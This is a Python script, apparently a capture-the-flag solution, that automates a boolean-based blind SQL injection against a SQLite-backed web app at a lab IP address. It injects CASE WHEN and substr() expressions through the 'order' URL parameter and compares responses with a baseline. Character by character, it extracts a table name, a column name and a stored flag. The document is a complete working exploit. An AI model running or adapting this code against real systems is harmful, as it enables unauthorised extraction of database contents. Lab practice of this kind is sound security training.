#!/usr/bin/env python3
import requests, threading, string, time

URL = "http://10.10.78.253"
CHARS = [chr(i) for i in range(33, 127)]          
SESSION = requests.Session()
SESSION.headers["User-Agent"] = "pwn"

BASE_BODY = SESSION.get(
    URL + "/?order=(CASE WHEN (1=1) THEN title ELSE date END)--",
    timeout=6).content

lock   = threading.Lock()   
result = []                 
stop   = False             

def same(body):                     
    return body == BASE_BODY

def request(payload):
    for _ in range(3):               
        try:
            r = SESSION.get(URL + payload, timeout=6)
            return r.content
        except requests.RequestException:
            time.sleep(0.5)
    raise RuntimeError("network error")

def worker(pos, sql_template):
    global stop
    if stop:             
        return
    for ch in CHARS:
        payload = sql_template.format(pos=pos, ch=ch)
        if same(request(payload)):
            with lock:
                result.append((pos, ch))
            return
    stop = True

def dump(sql_template):
    global result, stop
    result, stop = [], False
    pos = 1
    while not stop:
        th = threading.Thread(target=worker, args=(pos, sql_template))
        th.start(); th.join()
        pos += 1
    text = "".join(ch for _, ch in sorted(result))
    return text

tbl_name = dump(
    "/?order=(CASE WHEN (substr((SELECT name FROM sqlite_schema "
    "WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 1),"
    "{pos},1)='{ch}') THEN title ELSE date END)--")
print("[tables] :", tbl_name)

col_name = dump(
    f"/?order=(CASE WHEN (substr((SELECT name FROM pragma_table_info('{tbl_name}') "
    "LIMIT 1 OFFSET 0),{pos},1)='{ch}') THEN title ELSE date END)--")
print("[column] :", col_name)

flag = dump(
    f"/?order=(CASE WHEN (substr((SELECT {col_name} FROM {tbl_name} LIMIT 1),"
    "{pos},1)='{ch}') THEN title ELSE date END)--")
print("[flag]   :", flag)
